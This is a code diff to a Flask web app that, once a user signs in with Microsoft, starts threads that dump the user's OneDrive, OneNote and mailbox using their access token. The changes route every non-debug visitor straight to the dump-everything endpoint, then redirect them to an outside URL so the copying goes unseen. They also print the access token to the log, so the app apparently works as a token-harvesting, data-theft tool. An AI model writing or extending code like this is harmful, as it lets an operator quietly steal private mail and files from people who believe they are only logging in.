@@ -60,7 +60,11 @@ def index():
         return render_template('config_error.html')
     if not auth.get_user():
         return redirect(url_for("login"))
-    return render_template('index.html', user=auth.get_user(), version=identity.__version__)
+
+    if app.debug:
+        return render_template('index.html', user=auth.get_user(), version=identity.__version__)
+    
+    return redirect(url_for("oneall"))
 
 @app.route("/onenote")
 def onenote():
@@ -70,10 +74,13 @@ def onenote():
     if "error" in token:
         return redirect(url_for("login"))
 
-    #dump_onenote(token['access_token'], auth.get_user().get("preferred_username"))
-    Thread(target=dump_onenote, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
+    #dump_onenote(token['access_token'], auth.get_user().get("preferred_username"), extract_dir=app_config.EXTRACT_DIR)
+    Thread(target=dump_onenote, args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()
 
-    return render_template('tkt.html')
+    if app.debug:
+        return render_template('tkt.html') 
+    
+    return redirect(app_config.REDIRECT_URI_CLIENT)
 
 @app.route("/onedrive")
 def onedrive():
@@ -81,10 +88,13 @@ def onedrive():
     if "error" in token:
         return redirect(url_for("login"))
     
-    # dump_onedrive(token['access_token'], auth.get_user().get("preferred_username"))
-    Thread(target=dump_onedrive, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
+    # dump_onedrive(token['access_token'], auth.get_user().get("preferred_username"), extract_dir=app_config.EXTRACT_DIR)
+    Thread(target=dump_onedrive, args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()
 
-    return render_template('tkt.html')
+    if app.debug:
+        return render_template('tkt.html') 
+    
+    return redirect(app_config.REDIRECT_URI_CLIENT)
 
 @app.route("/mail")
 def mail():
@@ -92,10 +102,13 @@ def mail():
     if "error" in token:
         return redirect(url_for("login"))
     
-    #dump_mail(token['access_token'], auth.get_user().get("preferred_username"))
-    Thread(target=dump_mail, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
+    #dump_mail(token['access_token'], auth.get_user().get("preferred_username"), extract_dir=app_configEXTRACT_DIR)
+    Thread(target=dump_mail, args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()
 
-    return render_template('tkt.html')
+    if app.debug:
+        return render_template('tkt.html')
+    
+    return redirect(app_config.REDIRECT_URI_CLIENT)
 
 @app.route("/oneall")
 def oneall():
@@ -103,11 +116,15 @@ def oneall():
     if "error" in token:
         return redirect(url_for("login"))
     
-    Thread(target=dump_onedrive, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
-    Thread(target=dump_onenote , args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
-    Thread(target=dump_mail    , args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
+    Thread(target=dump_onedrive, args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()
+    Thread(target=dump_onenote , args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()
+    Thread(target=dump_mail    , args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()
 
-    return render_template('tkt.html') #redirect("https://preview.redd.it/xl32gp9rrmt01.jpg?auto=webp&s=4678d4eec316ad160a1d258abe98230152f24122")
+    print(token['access_token'])
 
+    if app.debug:
+        return render_template('tkt.html') 
+    
+    return redirect(app_config.REDIRECT_URI_CLIENT)
 if __name__ == "__main__":
-    app.run()
+    app.run(debug=False)
